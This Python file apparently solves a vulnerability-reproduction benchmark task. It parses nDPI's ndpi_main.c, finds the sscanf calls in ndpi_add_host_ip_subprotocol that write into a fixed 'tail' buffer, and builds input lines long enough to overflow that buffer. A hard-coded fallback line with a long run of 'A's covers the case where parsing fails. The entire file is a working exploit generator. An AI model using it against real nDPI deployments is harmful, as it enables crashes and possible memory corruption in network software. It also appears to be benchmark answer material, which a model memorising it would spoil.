import os
import re


class Spec:
    def __init__(self, start, end, suppressed, conv, width, scanset, consumes_input):
        self.start = start
        self.end = end
        self.suppressed = suppressed
        self.conv = conv
        self.width = width
        self.scanset = scanset
        self.consumes_input = consumes_input


class Solution:
    def solve(self, src_path: str) -> bytes:
        try:
            poc = self._generate_poc(src_path)
            if poc:
                return poc
        except Exception:
            pass
        return self._fallback_poc()

    # Top-level PoC generation
    def _generate_poc(self, src_path: str) -> bytes:
        ndpi_main_path = self._find_file(src_path, "ndpi_main.c")
        if not ndpi_main_path:
            return None

        try:
            text = self._read_file(ndpi_main_path)
        except Exception:
            return None

        func_body = self._extract_function_body(text, "ndpi_add_host_ip_subprotocol")
        if not func_body:
            return None

        tail_size = self._extract_tail_size(func_body)
        if not tail_size:
            tail_size = 16  # conservative default

        sscanf_calls = self._find_sscanf_calls_with_tail(func_body)
        if not sscanf_calls:
            return None

        poc_lines = []

        for call_str in sscanf_calls:
            info = self._parse_sscanf_call(call_str)
            if not info:
                continue
            fmt = info["fmt"]
            args = info["args"]

            specs = self._parse_scanf_format(fmt)
            if not specs:
                continue

            target_info = self._locate_tail_spec(args, specs)
            if not target_info:
                continue

            tail_global_idx = target_info["tail_global_idx"]

            tokens = self._build_tokens_for_specs(
                specs=specs,
                tail_global_idx=tail_global_idx,
                tail_size=tail_size,
            )

            line = self._build_input_from_format(fmt, specs, tokens)
            if not line:
                continue

            if not line.endswith("\n"):
                line += "\n"
            poc_lines.append(line)

        if not poc_lines:
            return None

        poc_text = "".join(poc_lines)
        return poc_text.encode("ascii", errors="replace")

    # Helper: find file recursively
    def _find_file(self, root: str, filename: str):
        for dirpath, _, filenames in os.walk(root):
            if filename in filenames:
                return os.path.join(dirpath, filename)
        return None

    # Helper: read file as text
    def _read_file(self, path: str) -> str:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return f.read()

    # Helper: extract C function body by name
    def _extract_function_body(self, text: str, func_name: str):
        m = re.search(r"\b%s\s*\(" % re.escape(func_name), text)
        if not m:
            return None
        idx = m.end()
        n = len(text)
        while idx < n and text[idx] != "{":
            idx += 1
        if idx >= n or text[idx] != "{":
            return None
        start = idx
        depth = 0
        i = start
        while i < n:
            c = text[i]
            if c == "{":
                depth += 1
            elif c == "}":
                depth -= 1
                if depth == 0:
                    return text[start : i + 1]
            i += 1
        return None

    # Helper: extract tail buffer size from declaration
    def _extract_tail_size(self, func_body: str):
        # Prefer direct "char tail[NN]"
        m = re.search(r"\bchar\s+tail\s*\[\s*(\d+)\s*\]", func_body)
        if m:
            try:
                return int(m.group(1))
            except ValueError:
                pass
        # Fallback: any "tail[NN]"
        m = re.search(r"\btail\s*\[\s*(\d+)\s*\]", func_body)
        if m:
            try:
                return int(m.group(1))
            except ValueError:
                pass
        return None

    # Helper: find all sscanf calls that reference 'tail'
    def _find_sscanf_calls_with_tail(self, func_body: str):
        calls = []
        for m in re.finditer(r"\bsscanf\s*\(", func_body):
            start = m.start()
            paren_start = func_body.find("(", start)
            if paren_start == -1:
                continue
            paren_end = self._match_paren(func_body, paren_start)
            if paren_end == -1:
                continue
            call_str = func_body[start : paren_end + 1]
            if "tail" in call_str:
                calls.append(call_str)
        return calls

    # Helper: match parentheses, return index of matching ')'
    def _match_paren(self, text: str, pos: int):
        depth = 0
        n = len(text)
        for i in range(pos, n):
            c = text[i]
            if c == "(":
                depth += 1
            elif c == ")":
                depth -= 1
                if depth == 0:
                    return i
        return -1

    # Helper: split function-call argument list string into arguments
    def _split_arguments(self, s: str):
        args = []
        cur = []
        depth = 0
        in_single = False
        in_double = False
        escape = False

        for ch in s:
            if escape:
                cur.append(ch)
                escape = False
                continue
            if ch == "\\":
                escape = True
                cur.append(ch)
                continue

            if in_single:
                cur.append(ch)
                if ch == "'":
                    in_single = False
                continue

            if in_double:
                cur.append(ch)
                if ch == '"':
                    in_double = False
                continue

            if ch == "'":
                in_single = True
                cur.append(ch)
                continue
            if ch == '"':
                in_double = True
                cur.append(ch)
                continue

            if ch == "(":
                depth += 1
                cur.append(ch)
                continue
            if ch == ")":
                depth -= 1
                cur.append(ch)
                continue

            if ch == "," and depth == 0:
                arg = "".join(cur).strip()
                if arg:
                    args.append(arg)
                cur = []
                continue

            cur.append(ch)

        last = "".join(cur).strip()
        if last:
            args.append(last)
        return args

    # Helper: decode (possibly simple) C string literal from argument
    def _extract_c_string(self, s: str):
        # Support simple concatenation: "foo" "bar"
        res_parts = []
        n = len(s)
        i = 0
        while i < n:
            while i < n and s[i] != '"':
                i += 1
            if i >= n or s[i] != '"':
                break
            i += 1  # skip opening quote
            part = []
            escape = False
            while i < n:
                ch = s[i]
                if escape:
                    if ch == "n":
                        part.append("\n")
                    elif ch == "t":
                        part.append("\t")
                    elif ch == "r":
                        part.append("\r")
                    elif ch == "b":
                        part.append("\b")
                    elif ch == "f":
                        part.append("\f")
                    elif ch == "a":
                        part.append("\a")
                    elif ch == "\\":
                        part.append("\\")
                    elif ch == '"':
                        part.append('"')
                    elif ch == "'":
                        part.append("'")
                    elif ch == "0":
                        part.append("\x00")
                    else:
                        part.append(ch)
                    escape = False
                    i += 1
                    continue
                if ch == "\\":
                    escape = True
                    i += 1
                    continue
                if ch == '"':
                    i += 1
                    break
                part.append(ch)
                i += 1
            res_parts.append("".join(part))
            # skip whitespace before possible next concatenated literal
            while i < n and s[i].isspace():
                i += 1
            if i < n and s[i] == '"':
                continue
            else:
                break
        if not res_parts:
            return None
        return "".join(res_parts)

    # Helper: parse one sscanf call string
    def _parse_sscanf_call(self, call_str: str):
        paren_start = call_str.find("(")
        if paren_start == -1 or not call_str.endswith(")"):
            return None
        inner = call_str[paren_start + 1 : -1]
        args = self._split_arguments(inner)
        if len(args) < 3:
            return None
        fmt = self._extract_c_string(args[1])
        if fmt is None:
            return None
        return {"args": args, "fmt": fmt}

    # Helper: parse scanf format string into Spec objects
    def _parse_scanf_format(self, fmt: str):
        specs = []
        i = 0
        n = len(fmt)
        while i < n:
            ch = fmt[i]
            if ch != "%":
                i += 1
                continue
            if i + 1 < n and fmt[i + 1] == "%":
                # literal '%'
                i += 2
                continue
            start = i
            j = i + 1
            suppressed = False
            if j < n and fmt[j] == "*":
                suppressed = True
                j += 1
            # width
            width_str = ""
            while j < n and fmt[j].isdigit():
                width_str += fmt[j]
                j += 1
            width = int(width_str) if width_str else None
            # length modifiers
            while j < n and fmt[j] in "hljztL":
                j += 1
            if j >= n:
                break
            conv_char = fmt[j]
            scanset = None
            end = j
            if conv_char == "[":
                k = j + 1
                while k < n and fmt[k] != "]":
                    k += 1
                end = k if k < n else n - 1
                scanset = fmt[j + 1 : end]
            consumes_input = conv_char != "n"
            specs.append(Spec(start=start, end=end, suppressed=suppressed, conv=conv_char, width=width, scanset=scanset, consumes_input=consumes_input))
            i = end + 1
        return specs

    # Helper: locate which format spec corresponds to 'tail' argument
    def _locate_tail_spec(self, args, specs):
        # arguments: [str, fmt, arg0, arg1, ...]
        target_arg_index = None
        for idx, arg in enumerate(args[2:], start=2):
            if re.search(r"\btail\b", arg):
                target_arg_index = idx
                break
        if target_arg_index is None:
            return None
        spec_arg_index = target_arg_index - 2
        # specs that correspond to actual arguments (non-suppressed)
        arg_spec_indices = [i for i, sp in enumerate(specs) if not sp.suppressed]
        if spec_arg_index < 0 or spec_arg_index >= len(arg_spec_indices):
            return None
        tail_global_idx = arg_spec_indices[spec_arg_index]
        return {"tail_global_idx": tail_global_idx}

    # Helper: choose a character acceptable for a scanf scanset
    def _choose_char_for_scanset(self, scanset: str):
        if not scanset:
            return "A"
        complement = False
        s = scanset
        if s[0] == "^":
            complement = True
            s = s[1:]

        def in_set(ch: str) -> bool:
            i = 0
            ln = len(s)
            while i < ln:
                c1 = s[i]
                if i + 2 < ln and s[i + 1] == "-":
                    c2 = s[i + 2]
                    if c1 <= ch <= c2:
                        return True
                    i += 3
                else:
                    if ch == c1:
                        return True
                    i += 1
            return False

        candidates = ["A", "a", "0", "1", "9", ".", ":", "/", "-", "_", " "]
        for ch in candidates:
            inside = in_set(ch)
            allowed = (not inside) if complement else inside
            if allowed:
                return ch
        return "A"

    # Helper: build tokens for each format spec
    def _build_tokens_for_specs(self, specs, tail_global_idx: int, tail_size: int):
        tokens = [""] * len(specs)
        # Choose a sufficiently large length to overflow original tail buffer
        tail_len = max(tail_size * 4, tail_size + 64, 64)

        for idx, sp in enumerate(specs):
            if not sp.consumes_input:
                tokens[idx] = ""
                continue

            if sp.conv == "[":
                ch = self._choose_char_for_scanset(sp.scanset)
            elif sp.conv == "s":
                ch = "A"
            elif sp.conv == "c":
                ch = "C"
            elif sp.conv in "diuoxXp":
                ch = "1"
            elif sp.conv in "fFeEgGaA":
                ch = "1"
            else:
                ch = "1"

            if idx == tail_global_idx:
                length = tail_len
            else:
                if sp.width is not None and sp.width > 0:
                    max_len = sp.width
                else:
                    max_len = 3
                if max_len <= 0:
                    max_len = 1
                length = min(max_len, 3)
                if length <= 0:
                    length = 1

            tokens[idx] = ch * length
        return tokens

    # Helper: build an input string from format and tokens
    def _build_input_from_format(self, fmt: str, specs, tokens):
        out = []
        i = 0
        n = len(fmt)
        spec_idx = 0
        while i < n:
            ch = fmt[i]
            if ch != "%":
                out.append(ch)
                i += 1
                continue
            # handle literal %%
            if i + 1 < n and fmt[i + 1] == "%":
                out.append("%")
                i += 2
                continue
            if spec_idx >= len(specs):
                # malformed; bail
                i += 1
                continue
            sp = specs[spec_idx]
            token = tokens[spec_idx] if spec_idx < len(tokens) else ""
            out.append(token)
            i = sp.end + 1
            spec_idx += 1
        return "".join(out)

    # Fallback PoC if parsing fails
    def _fallback_poc(self) -> bytes:
        # Generic guess: a line with multiple fields and a long tail
        line = "1,1,1,1,AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n"
        return line.encode("ascii", errors="replace")
